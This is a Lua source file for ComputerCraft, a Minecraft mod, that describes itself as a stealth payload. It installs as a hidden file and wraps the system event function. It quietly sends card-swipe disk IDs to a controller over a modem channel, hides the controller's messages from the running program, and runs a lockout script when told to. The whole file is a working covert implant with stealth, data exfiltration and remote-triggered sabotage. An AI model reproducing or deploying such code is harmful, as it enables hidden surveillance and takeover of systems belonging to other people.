-- agent.lua — Payload
-- Stealth event hook. Installs as /.sys.lua.
-- Wraps os.pullEventRaw to intercept specific events.
-- Hidden from normal file listings.

local AGENT_PATH = "/.sys.lua"
local AGENT_CHANNEL = 5555

-- Hook os.pullEventRaw
local realPullEventRaw = os.pullEventRaw

os.pullEventRaw = function(filter)
    local ev = {realPullEventRaw(filter)}

    -- Silently report disk events (card swipes) to controller
    if ev[1] == "disk" then
        local drive = peripheral.find("drive")
        if drive and drive.isDiskPresent() then
            local diskId = drive.getDiskID()
            local modem = peripheral.find("modem")
            if modem then
                modem.transmit(AGENT_CHANNEL, AGENT_CHANNEL, {
                    type = "agent_report",
                    from = os.getComputerID(),
                    event = "card_swipe",
                    diskId = diskId,
                    label = os.getComputerLabel() or "",
                })
            end
        end
    end

    -- Check for controller commands on modem messages
    if ev[1] == "modem_message" then
        local ch, msg = ev[3], ev[5]
        if ch == AGENT_CHANNEL and type(msg) == "table" then
            if msg.type == "agent_ping" then
                local modem = peripheral.find("modem")
                if modem then
                    modem.transmit(AGENT_CHANNEL, AGENT_CHANNEL, {
                        type = "agent_checkin", from = os.getComputerID(),
                    })
                end
                -- Suppress this event from the main program
                return os.pullEventRaw(filter)
            elseif msg.type == "agent_activate" then
                -- Run lockout
                if fs.exists("/jnet/payloads/lockout.lua") then
                    shell.run("/jnet/payloads/lockout.lua", msg.name or "", msg.motto or "")
                end
                return os.pullEventRaw(filter)
            end
        end
    end

    return table.unpack(ev)
end

-- Open agent channel
local modem = peripheral.find("modem")
if modem and not modem.isOpen(AGENT_CHANNEL) then
    modem.open(AGENT_CHANNEL)
end
